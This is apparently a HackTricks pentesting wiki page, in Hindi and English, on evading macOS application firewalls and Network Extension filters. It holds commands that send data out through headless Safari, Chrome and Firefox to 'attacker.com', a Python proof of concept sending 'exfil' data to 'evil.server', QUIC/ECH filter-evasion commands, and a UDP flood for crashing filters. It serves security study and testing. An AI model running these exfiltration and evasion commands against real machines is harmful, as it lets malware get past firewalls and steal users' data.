# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## पाई गई तकनीकें

निम्न तकनीकें कुछ macOS firewall apps में काम करती हुई पाई गईं।

### whitelist names का दुरुपयोग

- उदाहरण के लिए malware को जाने-माने macOS processes के नामों से कॉल करना जैसे **`launchd`**

### Synthetic Click

- अगर firewall उपयोगकर्ता से अनुमति माँगता है तो malware को **click on allow** करवा दें

### **Apple signed binaries का उपयोग करें**

- उदाहरण के लिए **`curl`**, और अन्य जैसे **`whois`**

### जाने-माने apple domains

firewall कुछ जाने-माने apple domains जैसे **`apple.com`** या **`icloud.com`** के कनेक्शनों की अनुमति दे सकता है। और iCloud का उपयोग C2 के रूप में किया जा सकता है।

### Generic Bypass

firewalls को बायपास करने के लिए कुछ विचार

### अनुमति प्राप्त ट्रैफ़िक की जाँच करें

अनुमत ट्रैफ़िक को जानने से आपको संभावित whitelisted domains या वे applications जो उन्हें access कर सकते हैं, पहचानने में मदद मिलेगी।
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS का दुरुपयोग

DNS रिज़ॉल्यूशन **`mdnsreponder`** साइन की गई एप्लिकेशन के माध्यम से किया जाता है, जिसे संभवतः DNS सर्वरों से संपर्क करने की अनुमति होगी।

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### ब्राउज़र ऐप्स के माध्यम से

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- गूगल क्रोम
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via processes injections

यदि आप **inject code into a process** कर सकते हैं जो किसी भी सर्वर से कनेक्ट करने की अनुमति रखता है, तो आप फ़ायरवॉल सुरक्षा को बायपास कर सकते हैं:

{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## हाल की macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
जुलाई 2024 में Apple ने Safari/WebKit में एक critical bug को patch किया जिसने system-wide “Web content filter” को तोड़ दिया जो Screen Time parental controls द्वारा उपयोग किया जाता है।
विशेष रूप से तैयार किया गया URI (उदा., double URL-encoded “://”) Screen Time ACL द्वारा पहचान नहीं किया जाता लेकिन WebKit द्वारा स्वीकार कर लिया जाता है, इसलिए अनुरोध बिना फ़िल्टर के भेज दिया जाता है। इसलिए कोई भी process जो एक URL खोल सकता है (including sandboxed or unsigned code) उन domains तक पहुँच सकता है जिन्हें user या किसी MDM profile द्वारा स्पष्ट रूप से blocked किया गया है।

Practical test (un-patched system):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### प्रारंभिक macOS 14 “Sonoma” में Packet Filter (PF) का rule-ordering बग
macOS 14 बीटा चक्र के दौरान Apple ने **`pfctl`** के चारों ओर के यूज़रस्पेस रैपर में एक regression पेश किया।
`quick` कीवर्ड के साथ जोड़े गए नियम (जो कई VPN kill-switches द्वारा उपयोग होते हैं) चुपचाप अनदेखा कर दिए जाते थे, जिससे ट्रैफ़िक leaks होते थे भले ही VPN/firewall GUI ने *blocked* दिखाया हो। यह बग कई VPN विक्रेताओं द्वारा पुष्टि की गई और RC 2 (build 23A344) में फिक्स की गई।

त्वरित leak-चेक:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Apple-signed helper services का दुरुपयोग (legacy – pre-macOS 11.2)
macOS 11.2 से पहले, **`ContentFilterExclusionList`** लगभग 50 Apple binaries—जैसे **`nsurlsessiond`** और App Store—को Network Extension framework (LuLu, Little Snitch, आदि) के साथ implement किए गए सभी socket-filter firewalls को bypass करने की अनुमति देता था।
Malware सरलता से किसी excluded process को spawn कर सकता था—या उसमें inject code कर सकता था—और अपने ट्रैफ़िक को पहले से allowed socket पर tunnel कर सकता था। Apple ने macOS 11.2 में exclusion list को पूरी तरह हटा दिया, पर यह तकनीक उन सिस्टमों पर अभी भी प्रासंगिक है जिन्हें अपग्रेड नहीं किया जा सकता।

Example proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH से Network Extension domain filters (macOS 12+) को बायपास करना
NEFilter Packet/Data Providers TLS ClientHello SNI/ALPN पर काम करते हैं। **HTTP/3 over QUIC (UDP/443)** और **Encrypted Client Hello (ECH)** के साथ SNI एन्क्रिप्टेड रहता है, NetExt फ्लो को पार्स नहीं कर पाता, और hostname नियम अक्सर fail-open हो जाते हैं, जिससे malware बिना DNS को छुए blocked domains तक पहुँच सकता है।

Minimal PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
If QUIC/ECH is still enabled this is an easy hostname-filter evasion path.

### macOS 15 “Sequoia” Network Extension instability (2024–2025)
शुरुआती 15.0/15.1 बिल्ड तीसरे‑पक्ष के **Network Extension** filters (LuLu, Little Snitch, Defender, SentinelOne, आदि) को क्रैश कर देते हैं। जब फ़िल्टर पुनः प्रारंभ होता है तो macOS उसके flow rules हटा देता है और कई products fail‑open हो जाते हैं। हज़ारों छोटे UDP flows के साथ फ़िल्टर को फ़्लड करना (या QUIC/ECH को बाध्य करना) क्रैश को बार‑बार ट्रिगर कर सकता है और GUI अभी भी firewall चलने का दावा करते हुए C2/exfil के लिए विंडो छोड़ सकता है।

Quick reproduction (safe lab box):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## आधुनिक macOS के लिए टूलिंग टिप्स

1. GUI firewalls द्वारा जनरेट किए गए वर्तमान PF नियमों की जाँच करें:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. उन बाइनरीज़ की सूची बनाएँ जिनमें पहले से *outgoing-network* entitlement मौजूद है (piggy-backing के लिए उपयोगी):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Programmatically अपने Network Extension content filter को Objective-C/Swift में रजिस्टर करें। एक न्यूनतम rootless PoC, जो packets को local socket पर forward करता है, Patrick Wardle के **LuLu** source code में उपलब्ध है।

## संदर्भ

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
- <https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/>
- <https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos>

{{#include ../../banners/hacktricks-training.md}}
